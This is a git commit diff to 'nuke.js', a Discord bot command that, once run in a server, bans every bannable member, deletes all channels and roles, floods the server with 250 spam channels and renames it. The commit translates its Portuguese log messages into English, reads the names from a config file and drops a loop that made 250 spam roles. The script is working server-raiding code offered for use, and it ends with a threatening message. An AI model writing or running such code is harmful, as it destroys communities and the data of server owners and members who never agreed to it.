ade5f93b9358e6866373e65bbdf35f6a986c95f2
such <70591293+calculates@users.noreply.github.com>
2020-12-16 15:50:22 -0300

    Update nuke.js

--- commands/nuke.js
+++ commands/nuke.js
@@ -1,46 +1,38 @@
 const Discord = require('discord.js');
 const colors = require('colors');
+const config = require('../config.json')
 
 module.exports.run = async (client, msg, args) => {
     msg.delete();
     console.clear();
-    console.log('[info] Banindo todos os membros do servidor...'.red);
+    console.log('[info] Baning everyone on the guild...'.red);
     console.log(' ');
     await msg.guild.members.filter(member => member.bannable)
     .forEach(member => member.ban());
-    console.log(`[sucess] Todos os membros da guild foram banidos.`.green);
+    console.log(`[sucess] Everyone on the guild was banned.`.green);
     console.log(' ');
-    console.log(`[info] Apagando todos os canais do servidor...`.red);
+    console.log(`[info] Deleting every channel of the guild...`.red);
     await msg.guild.channels.deleteAll();
     console.log(' ');
-    console.log(`[sucess] Todos os canais da guild foram deletados.`.green);
+    console.log(`[sucess] Every channel of the guild was deleted.`.green);
     console.log(' ')
-    console.log('[info] Criando os canais de flood...'.red);
+    console.log('[info] Creating spam channels...'.red);
     for(i = 0; i < 250; i++){
-        await msg.guild.createChannel('Por ásperos caminhos até aos astros.');
+        await msg.guild.createChannel(config.nameChannels);
     }
     console.log(' ');
-    console.log('[sucess] Canais criados.'.green);
+    console.log('[sucess] Spam channels created.'.green);
     console.log(' ');
-    console.log('[info] Mudando o nome da guild.'.red);
+    console.log('[info] Changing guild name.'.red);
     console.log(' ');
-    await msg.guild.setName('Desvanecidos pela Astro, fiquem bem 🥰')
-    .then(updated => console.log(`[sucess] O nome da guild foi mudado para ${updated.name}.`.green))
+    await msg.guild.setName(config.nameGuild)
+    .then(updated => console.log(`[sucess] Guild name changed to ${updated.name}.`.green))
     .catch(console.error);
     console.log(' ');
-    console.log('[info] Apagando cargos...'.red);
+    console.log('[info] Deleting roles...'.red);
     await msg.guild.roles.deleteAll();
     console.log(' ');
-    console.log('[sucess] Todos os cargos apagados.'.green)
-    console.log(' ');
-    console.log('[info] Criando cargos de flood.'.red)
-    for(i = 0; i < 250; i++) {
-        await msg.guild.roles.create({ data: { name: 'discord.gg/bhop', permissions: ['SEND_MESSAGES'] } }).then(() => console.log('[sucess] Cargos de flood criado. '))
-        .catch(console.error)
-    }
+    console.log('[sucess] All roles was deleted.'.green)
     console.log(' ')
     console.log('[!] Que deus tenho piedade daqueles que mexeram conosco, pois nós mesmos, infelizmente, não teremos.'.blue);
 }
-
-
-
